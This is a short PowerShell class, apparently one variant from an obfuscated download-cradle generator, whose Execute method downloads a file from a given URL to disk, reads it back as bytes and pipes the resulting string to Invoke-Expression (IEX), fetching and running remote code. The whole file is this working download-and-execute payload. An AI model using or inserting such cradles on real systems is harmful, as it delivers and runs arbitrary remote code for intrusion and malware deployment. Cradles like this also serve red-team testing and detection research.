Class ObfDownloadFile8 {

    static Execute ([String]$url, [String]$path) {
        #CLI:  Disk\PsWebFile\Invoke\2
        (New-Object Net.WebClient).DownloadFile($url,$path);([System.String]::Join('',([Char[]](TYPE -Encodin Byte $path))))|IEX

    }

}